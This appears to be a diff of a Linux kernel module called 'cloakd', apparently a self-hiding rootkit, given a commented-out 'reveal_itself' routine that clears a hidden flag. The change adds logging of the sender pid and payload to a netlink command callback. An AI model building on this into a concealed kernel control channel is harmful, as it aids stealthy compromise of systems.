@@ -51,16 +51,24 @@ static void reveal_itself(void)
     params.hidden = false;
 }
 */
+
+/******************************************************************************
+ * Callback - when a netlink packet arrives 
+ * the kernel will invoke this function
+ *****************************************************************************/
 static void nl_recv_cmd(struct sk_buff *sk_buf)
 {
-    int pid;    /* pid of the calling process */
+    int pid;        /* pid of the calling process */
+    unsigned char *payload;  /* message payload */
     struct nlmsghdr *msg_hdr;
 
     printk(KERN_INFO "cloakd: netlink command\n");
-    msg_hdr = (struct nlmsghdr*)sk_buf->data;
+    msg_hdr = nlmsg_hdr(sk_buf);
     pid = msg_hdr->nlmsg_pid;
+    payload = nlmsg_data(msg_hdr);
 
     printk(KERN_INFO "cloakd: pid %d is calling us\n", pid);
+    printk(KERN_INFO "cloakd: payload=\"%s\"\n", payload);
 }
 
 static void netlink_init(void)
